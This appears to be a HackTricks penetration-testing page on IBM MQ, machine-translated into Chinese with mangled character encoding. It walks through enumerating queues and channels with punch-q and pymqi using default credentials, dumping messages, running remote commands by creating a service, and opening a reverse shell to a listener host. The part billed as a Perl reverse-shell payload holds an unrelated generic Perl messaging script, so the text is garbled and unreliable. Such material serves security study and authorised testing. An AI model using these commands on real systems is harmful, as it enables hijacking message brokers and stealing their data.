# 1414 - IBM MQ æ¸—é€æµ‹è¯•

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

IBM MQ æ˜¯ IBM çš„ä¸€é¡¹æŠ€æœ¯ï¼Œç”¨äºç®¡ç†æ¶ˆæ¯é˜Ÿåˆ—ã€‚ä¸å…¶ä»–**æ¶ˆæ¯ä»£ç†**æŠ€æœ¯ä¸€æ ·ï¼Œå®ƒä¸“é—¨ç”¨äºæ¥æ”¶ã€å­˜å‚¨ã€å¤„ç†å’Œåˆ†ç±»ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ä¹‹é—´çš„ä¿¡æ¯ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼Œ**å®ƒä¼šæš´éœ² IBM MQ TCP ç«¯å£ 1414**ã€‚
æœ‰æ—¶ï¼ŒHTTP REST API å¯ä»¥åœ¨ç«¯å£**9443**ä¸Šæš´éœ²ã€‚
æŒ‡æ ‡ï¼ˆPrometheusï¼‰ä¹Ÿå¯ä»¥é€šè¿‡ TCP ç«¯å£**9157**è®¿é—®ã€‚

IBM MQ TCP ç«¯å£ 1414 å¯ç”¨äºæ“ä½œæ¶ˆæ¯ã€é˜Ÿåˆ—ã€é€šé“ç­‰ï¼Œ**ä¹Ÿå¯ç”¨äºæ§åˆ¶å®ä¾‹**ã€‚

IBM åœ¨ [https://www.ibm.com/docs/en/ibm-mq](https://www.ibm.com/docs/en/ibm-mq) ä¸Šæä¾›äº†å¤§é‡çš„æŠ€æœ¯æ–‡æ¡£ã€‚

## å·¥å…·

å»ºè®®ä½¿ç”¨çš„ä¸€ä¸ªç®€å•åˆ©ç”¨å·¥å…·æ˜¯ **[punch-q](https://github.com/sensepost/punch-q)**ï¼Œä½¿ç”¨ Dockerã€‚è¯¥å·¥å…·æ­£åœ¨ç§¯æä½¿ç”¨ Python åº“ `pymqi`ã€‚

å¯¹äºæ›´æ‰‹åŠ¨çš„æ–¹æ³•ï¼Œä½¿ç”¨ Python åº“ **[pymqi](https://github.com/dsuch/pymqi)**ã€‚éœ€è¦[IBM MQ ä¾èµ–é¡¹](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc)ã€‚

### å®‰è£… pymqi

éœ€è¦å®‰è£…å’ŒåŠ è½½**IBM MQ ä¾èµ–é¡¹**ï¼š

1. åœ¨ [https://login.ibm.com/](https://login.ibm.com/) ä¸Šåˆ›å»ºä¸€ä¸ªè´¦æˆ·ï¼ˆIBMidï¼‰ã€‚
2. ä» [https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc) ä¸‹è½½ IBM MQ åº“ã€‚å¯¹äº Linux x86_64ï¼Œä¸‹è½½çš„æ–‡ä»¶æ˜¯ **9.0.0.4-IBM-MQC-LinuxX64.tar.gz**ã€‚
3. è§£å‹ç¼©ï¼ˆ`tar xvzf 9.0.0.4-IBM-MQC-LinuxX64.tar.gz`ï¼‰ã€‚
4. è¿è¡Œ `sudo ./mqlicense.sh` æ¥å—è®¸å¯åè®®ã€‚

> å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ Kali Linuxï¼Œè¯·ä¿®æ”¹æ–‡ä»¶ `mqlicense.sh`ï¼šåˆ é™¤/æ³¨é‡Šä»¥ä¸‹è¡Œï¼ˆåœ¨ç¬¬ 105-110 è¡Œä¹‹é—´ï¼‰ï¼š
>
> ```bash
> if [ ${BUILD_PLATFORM} != `uname`_`uname ${UNAME_FLAG}` ]
>   then
>     echo "ERROR: This package is incompatible with this system"
>     echo "       This package was built for ${BUILD_PLATFORM}"
>     exit 1
> fi
> ```

5. å®‰è£…ä»¥ä¸‹è½¯ä»¶åŒ…ï¼š
```bash
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesRuntime-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesClient-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesSDK-9.0.0-4.x86_64.rpm
```
6. ç„¶åï¼Œåœ¨è¿è¡Œå…¶ä»–ä½¿ç”¨è¿™äº›ä¾èµ–é¡¹çš„å·¥å…·ä¹‹å‰ï¼Œå°†`.so`æ–‡ä»¶ä¸´æ—¶æ·»åŠ åˆ°LDä¸­ï¼š`export LD_LIBRARY_PATH=/opt/mqm/lib64`ã€‚

ç„¶åï¼Œæ‚¨å¯ä»¥å…‹éš†é¡¹ç›®[pymqi](https://github.com/dsuch/pymqi)ï¼šå®ƒåŒ…å«æœ‰è¶£çš„ä»£ç ç‰‡æ®µã€å¸¸é‡ç­‰ã€‚æˆ–è€…æ‚¨å¯ä»¥ç›´æ¥ä½¿ç”¨`pip install pymqi`å®‰è£…è¯¥åº“ã€‚

### ä½¿ç”¨punch-q

#### ä½¿ç”¨Docker

åªéœ€ä½¿ç”¨ï¼š`sudo docker run --rm -ti leonjza/punch-q`ã€‚

#### ä¸ä½¿ç”¨Docker

å…‹éš†é¡¹ç›®[punch-q](https://github.com/sensepost/punch-q)ï¼Œç„¶åæŒ‰ç…§è‡ªè¿°æ–‡ä»¶è¿›è¡Œå®‰è£…ï¼ˆ`pip install -r requirements.txt && python3 setup.py install`ï¼‰ã€‚

å®‰è£…å®Œæˆåï¼Œå¯ä»¥ä½¿ç”¨`punch-q`å‘½ä»¤ã€‚

## æšä¸¾

æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨**punch-q**æˆ–**pymqi**æ¥æšä¸¾**é˜Ÿåˆ—ç®¡ç†å™¨åç§°ã€ç”¨æˆ·ã€é€šé“å’Œé˜Ÿåˆ—**ã€‚

### é˜Ÿåˆ—ç®¡ç†å™¨

æœ‰æ—¶ï¼Œæ²¡æœ‰å¯¹è·å–é˜Ÿåˆ—ç®¡ç†å™¨åç§°è¿›è¡Œä¿æŠ¤ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 discover name
Queue Manager name: MYQUEUEMGR
```
### é€šé“

**punch-q** ä½¿ç”¨ä¸€ä¸ªå†…éƒ¨ï¼ˆå¯ä¿®æ”¹çš„ï¼‰å­—å…¸æ¥æŸ¥æ‰¾ç°æœ‰çš„é€šé“ã€‚ä½¿ç”¨ç¤ºä¾‹ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd discover channels
"DEV.ADMIN.SVRCONN" exists and was authorised.
"SYSTEM.AUTO.SVRCONN" might exist, but user was not authorised.
"SYSTEM.DEF.SVRCONN" might exist, but user was not authorised.
```
æœ‰äº›IBM MQå®ä¾‹æ¥å—**æœªç»èº«ä»½éªŒè¯**çš„MQè¯·æ±‚ï¼Œå› æ­¤ä¸éœ€è¦`--username / --password`ã€‚å½“ç„¶ï¼Œè®¿é—®æƒé™ä¹Ÿå¯èƒ½ä¸åŒã€‚

ä¸€æ—¦æˆ‘ä»¬è·å¾—ä¸€ä¸ªé€šé“åç§°ï¼ˆè¿™é‡Œæ˜¯`DEV.ADMIN.SVRCONN`ï¼‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥æšä¸¾æ‰€æœ‰å…¶ä»–é€šé“ã€‚

å¯ä»¥ä½¿ç”¨**pymqi**ä¸­çš„ä»£ç ç‰‡æ®µ`code/examples/dis_channels.py`æ¥è¿›è¡Œæšä¸¾ï¼š
```python
import logging
import pymqi

logging.basicConfig(level=logging.INFO)

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

prefix = '*'

args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: prefix}

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
response = pcf.MQCMD_INQUIRE_CHANNEL(args)
except pymqi.MQMIError as e:
if e.comp == pymqi.CMQC.MQCC_FAILED and e.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
logging.info('No channels matched prefix `%s`' % prefix)
else:
raise
else:
for channel_info in response:
channel_name = channel_info[pymqi.CMQCFC.MQCACH_CHANNEL_NAME]
logging.info('Found channel `%s`' % channel_name)

qmgr.disconnect()

```
...ä½†æ˜¯**punch-q**ä¹ŸåµŒå…¥äº†é‚£éƒ¨åˆ†ï¼ˆåŒ…å«æ›´å¤šä¿¡æ¯ï¼ï¼‰ã€‚
å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show channels -p '*'
Showing channels with prefix: "*"...

| Name                 | Type              | MCA UID | Conn Name | Xmit Queue | Description     | SSL Cipher |
|----------------------|-------------------|---------|-----------|------------|-----------------|------------|
| DEV.ADMIN.SVRCONN    | Server-connection |         |           |            |                 |            |
| DEV.APP.SVRCONN      | Server-connection | app     |           |            |                 |            |
| SYSTEM.AUTO.RECEIVER | Receiver          |         |           |            | Auto-defined by |            |
| SYSTEM.AUTO.SVRCONN  | Server-connection |         |           |            | Auto-defined by |            |
| SYSTEM.DEF.AMQP      | AMQP              |         |           |            |                 |            |
| SYSTEM.DEF.CLUSRCVR  | Cluster-receiver  |         |           |            |                 |            |
| SYSTEM.DEF.CLUSSDR   | Cluster-sender    |         |           |            |                 |            |
| SYSTEM.DEF.RECEIVER  | Receiver          |         |           |            |                 |            |
| SYSTEM.DEF.REQUESTER | Requester         |         |           |            |                 |            |
| SYSTEM.DEF.SENDER    | Sender            |         |           |            |                 |            |
| SYSTEM.DEF.SERVER    | Server            |         |           |            |                 |            |
| SYSTEM.DEF.SVRCONN   | Server-connection |         |           |            |                 |            |
| SYSTEM.DEF.CLNTCONN  | Client-connection |         |           |            |                 |            |
```
### é˜Ÿåˆ—

è¿™é‡Œæœ‰ä¸€ä¸ªä½¿ç”¨ **pymqi** çš„ä»£ç ç‰‡æ®µï¼ˆ`dis_queues.py`ï¼‰ï¼Œä½†æ˜¯ **punch-q** å…è®¸æ£€ç´¢æœ‰å…³é˜Ÿåˆ—çš„æ›´å¤šä¿¡æ¯ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show queues -p '*'
Showing queues with prefix: "*"...
| Created   | Name                 | Type   | Usage   | Depth  | Rmt. QM | Rmt. Qu | Description                       |
|           |                      |        |         |        | GR Name | eue Nam |                                   |
|           |                      |        |         |        |         | e       |                                   |
|-----------|----------------------|--------|---------|--------|---------|---------|-----------------------------------|
| 2023-10-1 | DEV.DEAD.LETTER.QUEU | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 | E                    |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.1          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.2          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.3          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
# Truncated
```
## æ”»å‡»æ‰‹æ³•

### è½¬å‚¨æ¶ˆæ¯

æ‚¨å¯ä»¥é’ˆå¯¹é˜Ÿåˆ—/é€šé“è¿›è¡Œå—…æ¢/è½¬å‚¨æ¶ˆæ¯çš„æ“ä½œï¼ˆéç ´åæ€§æ“ä½œï¼‰ã€‚*ç¤ºä¾‹ï¼š*
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages sniff
```

```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages dump
```
**ä¸è¦çŠ¹è±«ï¼Œå¯¹æ‰€æœ‰å·²è¯†åˆ«çš„é˜Ÿåˆ—è¿›è¡Œè¿­ä»£ã€‚**

### ä»£ç æ‰§è¡Œ

> åœ¨ç»§ç»­ä¹‹å‰ï¼Œå…ˆäº†è§£ä¸€äº›ç»†èŠ‚ï¼šIBM MQå¯ä»¥é€šè¿‡å¤šç§æ–¹å¼è¿›è¡Œæ§åˆ¶ï¼šMQSCã€PCFã€æ§åˆ¶å‘½ä»¤ã€‚ä¸€äº›å¸¸è§çš„åˆ—è¡¨å¯ä»¥åœ¨[IBM MQæ–‡æ¡£](https://www.ibm.com/docs/en/ibm-mq/9.2?topic=reference-command-sets-comparison)ä¸­æ‰¾åˆ°ã€‚
> [**PCF**](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=commands-introduction-mq-programmable-command-formats)ï¼ˆ***å¯ç¼–ç¨‹å‘½ä»¤æ ¼å¼***ï¼‰æ˜¯æˆ‘ä»¬é‡ç‚¹å…³æ³¨çš„è¿œç¨‹ä¸å®ä¾‹äº¤äº’çš„æ–¹å¼ã€‚**punch-q**å’Œ**pymqi**éƒ½æ˜¯åŸºäºPCFäº¤äº’çš„ã€‚
>
> æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®æ‰¾åˆ°PCFå‘½ä»¤åˆ—è¡¨ï¼š
> * [æ¥è‡ªPCFæ–‡æ¡£](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=reference-definitions-programmable-command-formats)ï¼Œä»¥åŠ
> * [æ¥è‡ªå¸¸é‡](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqcmd-command-codes)ã€‚
>
> ä¸€ä¸ªæœ‰è¶£çš„å‘½ä»¤æ˜¯`MQCMD_CREATE_SERVICE`ï¼Œå…¶æ–‡æ¡£å¯ä»¥åœ¨[è¿™é‡Œ](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-change-copy-create-service-multiplatforms)æ‰¾åˆ°ã€‚å®ƒä»¥ä¸€ä¸ª`StartCommand`ä½œä¸ºå‚æ•°ï¼ŒæŒ‡å‘å®ä¾‹ä¸Šçš„ä¸€ä¸ªæœ¬åœ°ç¨‹åºï¼ˆä¾‹å¦‚ï¼š`/bin/sh`ï¼‰ã€‚
>
> æ–‡æ¡£ä¸­è¿˜å¯¹è¯¥å‘½ä»¤è¿›è¡Œäº†è­¦å‘Šï¼šâ€œæ³¨æ„ï¼šæ­¤å‘½ä»¤å…è®¸ç”¨æˆ·ä»¥mqmæƒé™è¿è¡Œä»»æ„å‘½ä»¤ã€‚å¦‚æœæˆäºˆä½¿ç”¨æ­¤å‘½ä»¤çš„æƒé™ï¼Œæ¶æ„æˆ–ç²—å¿ƒçš„ç”¨æˆ·å¯èƒ½ä¼šå®šä¹‰ä¸€ä¸ªæŸåæ‚¨çš„ç³»ç»Ÿæˆ–æ•°æ®çš„æœåŠ¡ï¼Œä¾‹å¦‚åˆ é™¤é‡è¦æ–‡ä»¶ã€‚â€
>
> *æ³¨æ„ï¼šæ ¹æ®IBM MQæ–‡æ¡£ï¼ˆç®¡ç†å‚è€ƒï¼‰ï¼Œè¿˜æœ‰ä¸€ä¸ªHTTPç«¯ç‚¹ä½äº`/admin/action/qmgr/{qmgrName}/mqsc`ï¼Œç”¨äºè¿è¡Œç­‰æ•ˆçš„MQSCå‘½ä»¤ä»¥åˆ›å»ºæœåŠ¡ï¼ˆ`DEFINE SERVICE`ï¼‰ã€‚è¿™ä¸ªæ–¹é¢åœ¨è¿™é‡Œè¿˜æ²¡æœ‰æ¶‰åŠã€‚*

ä½¿ç”¨PCFè¿›è¡Œè¿œç¨‹ç¨‹åºæ‰§è¡Œçš„æœåŠ¡åˆ›å»º/åˆ é™¤å¯ä»¥é€šè¿‡**punch-q**å®Œæˆï¼š

**ç¤ºä¾‹1**
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
```
> åœ¨ IBM MQ çš„æ—¥å¿—ä¸­ï¼Œæ‚¨å¯ä»¥è¯»åˆ°å‘½ä»¤å·²æˆåŠŸæ‰§è¡Œï¼š
>
> ```bash
> 2023-10-10T19:13:01.713Z AMQ5030I: å‘½ä»¤ '808544aa7fc94c48' å·²å¯åŠ¨ã€‚è¿›ç¨‹ID(618)ã€‚[ArithInsert1(618), CommentInsert1(808544aa7fc94c48)]
> ```

æ‚¨è¿˜å¯ä»¥æšä¸¾æœºå™¨ä¸Šç°æœ‰çš„ç¨‹åºï¼ˆè¿™é‡Œ `/bin/doesnotexist` ... ä¸å­˜åœ¨ï¼‰ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/doesnotexist" --arg
s "whatever"
Command: /bin/doesnotexist
Arguments: -c id
Service Name: 6e3ef5af652b4436

Creating service...
Starting service...
The program '/bin/doesnotexist' is not available on the remote system.
Giving the service 0 second(s) to live...
Cleaning up service...
Done
```
**è¯·æ³¨æ„ï¼Œç¨‹åºçš„å¯åŠ¨æ˜¯å¼‚æ­¥çš„ã€‚å› æ­¤ï¼Œæ‚¨éœ€è¦ç¬¬äºŒä¸ªé¡¹ç›®æ¥åˆ©ç”¨æ¼æ´** ***(ç”¨äºåå‘shellçš„ç›‘å¬å™¨ï¼Œä¸åŒæœåŠ¡ä¸Šçš„æ–‡ä»¶åˆ›å»ºï¼Œé€šè¿‡ç½‘ç»œè¿›è¡Œæ•°æ®æ³„éœ²...)***

**ç¤ºä¾‹2**

ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨åå‘shellï¼Œ**punch-q**è¿˜æä¾›äº†ä¸¤ä¸ªåå‘shellè´Ÿè½½ï¼š

* ä¸€ä¸ªä½¿ç”¨bash
* ä¸€ä¸ªä½¿ç”¨perl

*å½“ç„¶ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨`execute`å‘½ä»¤æ„å»ºè‡ªå®šä¹‰çš„åå‘shellè´Ÿè½½ã€‚*

å¯¹äºbashï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
å¯¹äºperlï¼š

```perl
use strict;
use warnings;

# è¿™æ˜¯ä¸€ä¸ªPerlè„šæœ¬ç¤ºä¾‹
# å®ƒç”¨äºè¿æ¥åˆ°IBM MQé˜Ÿåˆ—ç®¡ç†å™¨å¹¶å‘é€å’Œæ¥æ”¶æ¶ˆæ¯

use MQSeries;

# å®šä¹‰è¿æ¥å‚æ•°
my $qmgr_name = 'QMGR_NAME';
my $channel = 'CHANNEL_NAME';
my $host = 'HOST_NAME';
my $port = 'PORT_NUMBER';

# è¿æ¥åˆ°é˜Ÿåˆ—ç®¡ç†å™¨
my $qmgr = MQSeries::QueueManager->new(
    QueueManager => $qmgr_name,
    Channel     => $channel,
    TransportType => MQSeries::MQSERIES_MQXPT_TCP,
    ConnectionName => "$host($port)",
) or die "æ— æ³•è¿æ¥åˆ°é˜Ÿåˆ—ç®¡ç†å™¨: $MQSeries::MQReason\n";

# æ‰“å¼€å‘é€é˜Ÿåˆ—
my $send_queue = $qmgr->queue('SEND_QUEUE_NAME') or die "æ— æ³•æ‰“å¼€å‘é€é˜Ÿåˆ—: $MQSeries::MQReason\n";

# æ‰“å¼€æ¥æ”¶é˜Ÿåˆ—
my $recv_queue = $qmgr->queue('RECV_QUEUE_NAME') or die "æ— æ³•æ‰“å¼€æ¥æ”¶é˜Ÿåˆ—: $MQSeries::MQReason\n";

# å‘é€æ¶ˆæ¯
my $message = MQSeries::Message->new(
    MsgDesc => {
        Format => MQSeries::MQFMT_STRING,
    },
    Data => 'Hello, World!',
);
$send_queue->put(
    Message => $message,
) or die "æ— æ³•å‘é€æ¶ˆæ¯: $MQSeries::MQReason\n";

# æ¥æ”¶æ¶ˆæ¯
my $recv_message = MQSeries::Message->new();
$recv_queue->get(
    Message => $recv_message,
) or die "æ— æ³•æ¥æ”¶æ¶ˆæ¯: $MQSeries::MQReason\n";

# æ‰“å°æ¥æ”¶åˆ°çš„æ¶ˆæ¯å†…å®¹
print "æ¥æ”¶åˆ°çš„æ¶ˆæ¯: " . $recv_message->Data . "\n";

# å…³é—­é˜Ÿåˆ—
$send_queue->Close();
$recv_queue->Close();

# æ–­å¼€ä¸é˜Ÿåˆ—ç®¡ç†å™¨çš„è¿æ¥
$qmgr->Disconnect();
```

è¿™æ˜¯ä¸€ä¸ªPerlè„šæœ¬ç¤ºä¾‹ï¼Œç”¨äºè¿æ¥åˆ°IBM MQé˜Ÿåˆ—ç®¡ç†å™¨å¹¶å‘é€å’Œæ¥æ”¶æ¶ˆæ¯ã€‚é¦–å…ˆï¼Œéœ€è¦å®šä¹‰è¿æ¥å‚æ•°ï¼ŒåŒ…æ‹¬é˜Ÿåˆ—ç®¡ç†å™¨åç§°ï¼ˆ`$qmgr_name`ï¼‰ã€é€šé“åç§°ï¼ˆ`$channel`ï¼‰ã€ä¸»æœºåï¼ˆ`$host`ï¼‰å’Œç«¯å£å·ï¼ˆ`$port`ï¼‰ã€‚ç„¶åï¼Œä½¿ç”¨è¿™äº›å‚æ•°è¿æ¥åˆ°é˜Ÿåˆ—ç®¡ç†å™¨ã€‚æ¥ä¸‹æ¥ï¼Œæ‰“å¼€å‘é€é˜Ÿåˆ—å’Œæ¥æ”¶é˜Ÿåˆ—ï¼Œå¹¶åˆ†åˆ«å‘é€å’Œæ¥æ”¶æ¶ˆæ¯ã€‚å‘é€æ¶ˆæ¯æ—¶ï¼Œåˆ›å»ºä¸€ä¸ªåŒ…å«æ¶ˆæ¯å†…å®¹çš„`MQSeries::Message`å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨`put`æ–¹æ³•å°†å…¶å‘é€åˆ°å‘é€é˜Ÿåˆ—ã€‚æ¥æ”¶æ¶ˆæ¯æ—¶ï¼Œåˆ›å»ºä¸€ä¸ªç©ºçš„`MQSeries::Message`å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨`get`æ–¹æ³•ä»æ¥æ”¶é˜Ÿåˆ—ä¸­è·å–æ¶ˆæ¯ã€‚æœ€åï¼Œæ‰“å°æ¥æ”¶åˆ°çš„æ¶ˆæ¯å†…å®¹ï¼Œå¹¶å…³é—­é˜Ÿåˆ—å’Œä¸é˜Ÿåˆ—ç®¡ç†å™¨çš„è¿æ¥ã€‚
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
### è‡ªå®šä¹‰ PCF

æ‚¨å¯ä»¥æ·±å…¥ç ”ç©¶ IBM MQ æ–‡æ¡£ï¼Œå¹¶ç›´æ¥ä½¿ç”¨ **pymqi** Python åº“æ¥æµ‹è¯•åœ¨ **punch-q** ä¸­æœªå®ç°çš„ç‰¹å®š PCF å‘½ä»¤ã€‚

**ç¤ºä¾‹ï¼š**
```python
import pymqi

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
# Replace here with your custom PCF args and command
# The constants can be found in pymqi/code/pymqi/CMQCFC.py
args = {pymqi.CMQCFC.xxxxx: "value"}
response = pcf.MQCMD_CUSTOM_COMMAND(args)
except pymqi.MQMIError as e:
print("Error")
else:
# Process response

qmgr.disconnect()

```
å¦‚æœæ‚¨æ‰¾ä¸åˆ°å¸¸é‡åç§°ï¼Œå¯ä»¥å‚è€ƒ[IBM MQæ–‡æ¡£](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqca-character-attribute-selectors)ã€‚

> *ä»¥[`MQCMD_REFRESH_CLUSTER`](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-mqcmd-refresh-cluster-refresh-cluster)ï¼ˆåè¿›åˆ¶ = 73ï¼‰ä¸ºä¾‹ã€‚å®ƒéœ€è¦å‚æ•°`MQCA_CLUSTER_NAME`ï¼ˆåè¿›åˆ¶ = 2029ï¼‰ï¼Œå¯ä»¥æ˜¯`*`ï¼ˆæ–‡æ¡£ï¼šï¼‰*
>
> ```python
> import pymqi
>
> queue_manager = 'MYQUEUEMGR'
> channel = 'DEV.ADMIN.SVRCONN'
> host = '172.17.0.2'
> port = '1414'
> conn_info = '%s(%s)' % (host, port)
> user = 'admin'
> password = 'passw0rd'
>
> qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
> pcf = pymqi.PCFExecute(qmgr)
>
> try:
>     args = {2029: "*"}
>     response = pcf.MQCMD_REFRESH_CLUSTER(args)
> except pymqi.MQMIError as e:
>     print("é”™è¯¯")
> else:
>     print(response)
>
> qmgr.disconnect()
> ```

## æµ‹è¯•ç¯å¢ƒ

å¦‚æœæ‚¨æƒ³æµ‹è¯•IBM MQçš„è¡Œä¸ºå’Œæ¼æ´ï¼Œå¯ä»¥åŸºäºDockerè®¾ç½®æœ¬åœ°ç¯å¢ƒï¼š

1. åœ¨ibm.comå’Œcloud.ibm.comä¸Šæ‹¥æœ‰ä¸€ä¸ªå¸æˆ·ã€‚
2. ä½¿ç”¨ä»¥ä¸‹æ­¥éª¤åˆ›å»ºä¸€ä¸ªå®¹å™¨åŒ–çš„IBM MQï¼š
```bash
sudo docker pull icr.io/ibm-messaging/mq:9.3.2.0-r2
sudo docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:9.3.2.0-r2
```
é»˜è®¤æƒ…å†µä¸‹ï¼Œèº«ä»½éªŒè¯å·²å¯ç”¨ï¼Œç”¨æˆ·åä¸º`admin`ï¼Œå¯†ç ä¸º`passw0rd`ï¼ˆç¯å¢ƒå˜é‡`MQ_ADMIN_PASSWORD`ï¼‰ã€‚
